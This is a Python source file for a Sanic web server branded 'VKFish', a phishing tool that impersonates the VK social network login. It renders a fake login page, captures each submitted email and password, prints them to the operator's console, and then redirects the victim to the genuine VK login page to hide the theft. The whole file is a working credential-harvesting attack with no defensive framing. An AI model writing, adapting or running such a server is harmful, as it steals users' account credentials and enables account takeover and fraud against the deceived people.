from sanic import Sanic, response
from sanic.response import json
from sanic.request import Request
from sanic_jinja2 import SanicJinja2
from sanic_session import Session, InMemorySessionInterface
import os, ctypes, settings

console_clear = 'clear'
try:
	kernel32 = ctypes.windll.kernel32
	kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
	console_clear = 'cls'
except:
	pass

logo = """\033[34m
 __      ___  ________ _     _     
 \ \    / / |/ /  ____(_)   | |    
  \ \  / /| ' /| |__   _ ___| |__  
   \ \/ / |  < |  __| | / __| '_ \ 
    \  /  | . \| |    | \__ \ | | |
     \/   |_|\_\_|    |_|___/_| |_|
\033[0m"""
os.system(console_clear)
print(logo)
print("\nEnter ctrl+c to exit")

app = Sanic(__name__)
session = Session(app, interface=InMemorySessionInterface())
jinja = SanicJinja2(app, session=session, pkg_path='template')

@app.route("/", methods=["POST", "GET"])
@jinja.template('index.html')
async def _(request: Request):
	if request.method == "POST":
		login = request.form.get("email")
		password = request.form.get("pass")
		print(f"\033[32mLogin: {login}\nPass: {password}\033[0m")
		return response.redirect("https://login.vk.com/?act=login")
	return {}

if __name__ == "__main__":
	app.run(host=settings.host, port=settings.port, debug=False, access_log=False)
